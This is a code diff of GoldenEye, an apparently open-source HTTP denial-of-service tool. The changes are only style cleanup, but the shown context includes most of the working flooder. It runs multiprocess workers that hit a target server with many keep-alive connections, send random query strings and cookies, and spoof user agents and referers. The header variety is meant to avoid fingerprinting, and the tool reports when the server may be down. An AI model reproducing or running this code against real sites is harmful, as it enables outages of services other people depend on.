@@ -39,9 +39,12 @@ THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
 BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
-from multiprocessing import Process, Manager, Pool
-import urllib.parse, ssl
-import sys, getopt, random, time, os
+from multiprocessing import Process, Manager
+import urllib.parse
+import ssl
+import sys
+import getopt
+import random
 import http.client
 HTTPCLIENT = http.client
 
@@ -82,19 +85,19 @@ USER_AGENT_PARTS = {
     },
     'platform': {
         'webkit': {
-            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
+            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
             'details': ['KHTML, like Gecko'],
-            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
+            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
         },
         'iexplorer': {
             'browser_info': {
                 'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                 'ext_pre': ['compatible', 'Windows; U'],
-                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
+                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + ['.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
             }
         },
         'gecko': {
-            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
+            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25)) for i in range(1, 30)],
             'details': [],
             'extensions': []
         }
@@ -104,6 +107,7 @@ USER_AGENT_PARTS = {
 ####
 # GoldenEye Class
 ####
+
 
 class GoldenEye(object):
 
@@ -135,7 +139,6 @@ class GoldenEye(object):
         # Initialize Counters
         self.counter = self.manager.list((0, 0))
 
-
     def exit(self):
         self.stats()
         print("Shutting down GoldenEye")
@@ -154,7 +157,8 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))
+        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
+            self.method, self.nr_workers, self.nr_sockets))
 
         if DEBUG:
             print("Starting {0} concurrent workers".format(self.nr_workers))
@@ -183,7 +187,8 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
+                print("{0} GoldenEye strikes hit. ({1} Failed)".format(
+                    self.counter[0], self.counter[1]))
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                     print("\tServer may be DOWN!")
@@ -191,7 +196,7 @@ class GoldenEye(object):
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
         except Exception:
-            pass # silently ignore
+            pass  # silently ignore
 
     def monitor(self):
         while len(self.workersQueue) > 0:
@@ -210,21 +215,19 @@ class GoldenEye(object):
                     try:
                         if DEBUG:
                             print("Killing worker {0}".format(worker.name))
-                        #worker.terminate()
+                        # worker.terminate()
                         worker.stop()
                     except Exception:
-                        pass # silently ignore
+                        pass  # silently ignore
                 if DEBUG:
                     raise
-                else:
-                    pass
 
 ####
 # Striker Class
 ####
 
-class Striker(Process):
 
+class Striker(Process):
 
     # Counters
     request_count = 0
@@ -267,27 +270,25 @@ class Striker(Process):
         if not self.port:
             self.port = 80 if not self.ssl else 443
 
-
         self.referers = [
             'http://www.google.com/',
             'http://www.bing.com/',
             'http://www.baidu.com/',
             'http://www.yandex.com/',
             'http://' + self.host + '/'
-            ]
-
+        ]
 
     def __del__(self):
         self.stop()
 
+    # builds random ascii string
 
-    #builds random ascii string
     def buildblock(self, size):
         out_str = ''
 
         _LOWERCASE = list(range(97, 122))
         _UPPERCASE = list(range(65, 90))
-        _NUMERIC   = list(range(48, 57))
+        _NUMERIC = list(range(48, 57))
 
         validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
@@ -296,7 +297,6 @@ class Striker(Process):
             out_str += chr(a)
 
         return out_str
-
 
     def run(self):
 
@@ -311,9 +311,11 @@ class Striker(Process):
 
                     if self.ssl:
                         if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                            c = HTTPCLIENT.HTTPSConnection(
+                                self.host, self.port)
                         else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                            c = HTTPCLIENT.HTTPSConnection(
+                                self.host, self.port, context=ssl._create_unverified_context())
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
@@ -323,7 +325,8 @@ class Striker(Process):
 
                     (url, headers) = self.createPayload()
 
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+                    method = random.choice(
+                        [METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
 
                     conn_req.request(method.upper(), url, None, headers)
 
@@ -339,7 +342,7 @@ class Striker(Process):
                 if DEBUG:
                     raise
                 else:
-                    pass # silently ignore
+                    pass  # silently ignore
 
         if DEBUG:
             print("Worker {0} completed run. Sleeping...".format(self.name))
@@ -349,8 +352,7 @@ class Striker(Process):
             try:
                 conn.close()
             except:
-                pass # silently ignore
-
+                pass  # silently ignore
 
     def createPayload(self):
 
@@ -365,19 +367,18 @@ class Striker(Process):
 
         return (req_url, random_headers)
 
-    def generateQueryString(self, ammount = 1):
+    def generateQueryString(self, ammount=1):
 
         queryString = []
 
         for i in range(ammount):
 
-            key = self.buildblock(random.randint(3,10))
-            value = self.buildblock(random.randint(3,20))
+            key = self.buildblock(random.randint(3, 10))
+            value = self.buildblock(random.randint(3, 20))
             element = "{0}={1}".format(key, value)
             queryString.append(element)
 
         return '&'.join(queryString)
-
 
     def generateData(self):
 
@@ -394,12 +395,11 @@ class Striker(Process):
 
         http_headers = self.generateRandomHeaders()
 
-
         return (request_url, http_headers)
 
-    def generateRequestUrl(self, param_joiner = '?'):
+    def generateRequestUrl(self, param_joiner='?'):
 
-        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
+        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))
 
     def getUserAgent(self):
 
@@ -408,17 +408,20 @@ class Striker(Process):
 
         # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
 
-        ## Mozilla Version
-        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6
+        # Mozilla Version
+        # hardcoded for now, almost every browser is on this version except IE6
+        mozilla_version = "Mozilla/5.0"
 
-        ## System And Browser Information
+        # System And Browser Information
         # Choose random OS
-        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
+        os = USER_AGENT_PARTS['os'][random.choice(
+            list(USER_AGENT_PARTS['os'].keys()))]
         os_name = random.choice(os['name'])
         sysinfo = os_name
 
         # Choose random platform
-        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]
+        platform = USER_AGENT_PARTS['platform'][random.choice(
+            list(USER_AGENT_PARTS['platform'].keys()))]
 
         # Get Browser Information if available
         if 'browser_info' in platform and platform['browser_info']:
@@ -427,13 +430,14 @@ class Striker(Process):
             browser_string = random.choice(browser['name'])
 
             if 'ext_pre' in browser:
-                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
+                browser_string = "%s; %s" % (random.choice(
+                    browser['ext_pre']), browser_string)
 
             sysinfo = "%s; %s" % (browser_string, sysinfo)
 
             if 'ext_post' in browser:
-                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
-
+                sysinfo = "%s; %s" % (
+                    sysinfo, random.choice(browser['ext_post']))
 
         if 'ext' in os and os['ext']:
             sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
@@ -444,10 +448,12 @@ class Striker(Process):
             ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
 
         if 'details' in platform and platform['details']:
-            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
+            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(
+                platform['details']) > 1 else platform['details'][0])
 
         if 'extensions' in platform and platform['extensions']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
+            ua_string = "%s %s" % (
+                ua_string, random.choice(platform['extensions']))
 
         return ua_string
 
@@ -460,9 +466,9 @@ class Striker(Process):
         noCache = ', '.join(noCacheDirectives[:nrNoCache])
 
         # Random accept encoding
-        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
+        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
         random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
+        nrEncodings = random.randint(1, int(len(acceptEncoding)/2))
         roundEncodings = acceptEncoding[:nrEncodings]
 
         http_headers = {
@@ -470,7 +476,7 @@ class Striker(Process):
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
+            'Keep-Alive': random.randint(1, 1000),
             'Host': self.host,
         }
 
@@ -480,28 +486,33 @@ class Striker(Process):
         # header count random and unfingerprintable
         if random.randrange(2) == 0:
             # Random accept-charset
-            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
+            acceptCharset = ['ISO-8859-1', 'utf-8',
+                             'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
             random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
+            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
+                acceptCharset[0], acceptCharset[1], round(random.random(), 1), round(random.random(), 1))
 
         if random.randrange(2) == 0:
             # Random Referer
-            url_part = self.buildblock(random.randint(5,10))
+            url_part = self.buildblock(random.randint(5, 10))
 
             random_referer = random.choice(self.referers) + url_part
 
             if random.randrange(2) == 0:
-                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+                random_referer = random_referer + '?' + \
+                    self.generateQueryString(random.randint(1, 10))
 
             http_headers['Referer'] = random_referer
 
         if random.randrange(2) == 0:
             # Random Content-Trype
-            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])
+            http_headers['Content-Type'] = random.choice(
+                ['multipart/form-data', 'application/x-url-encoded'])
 
         if random.randrange(2) == 0:
             # Random Cookie
-            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
+            http_headers['Cookie'] = self.generateQueryString(
+                random.randint(1, 5))
 
         return http_headers
 
@@ -525,7 +536,6 @@ class Striker(Process):
             pass
 
 
-
 ####
 
 ####
@@ -543,11 +553,14 @@ def usage():
     print(' OPTIONS:')
     print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
     print('\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
-    print('\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
-    print('\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
+    print(
+        '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
+    print(
+        '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
     print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
     print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
-    print('\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
+    print(
+        '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
     print('\t -h, --help\t\tShows this help')
     print()
     print('-----------------------------------------------------------------------------------------------------------')
@@ -562,6 +575,7 @@ def error(msg):
 ####
 # Main
 ####
+
 
 def main():
 
@@ -582,7 +596,8 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
+        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", [
+                                   "nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
@@ -615,7 +630,6 @@ def main():
             else:
                 error("option '"+o+"' doesn't exists")
 
-
         if uas_file:
             try:
                 with open(uas_file) as f:
@@ -637,6 +651,7 @@ def main():
         sys.stderr.write(str(err))
         usage()
         sys.exit(2)
+
 
 if __name__ == "__main__":
     main()
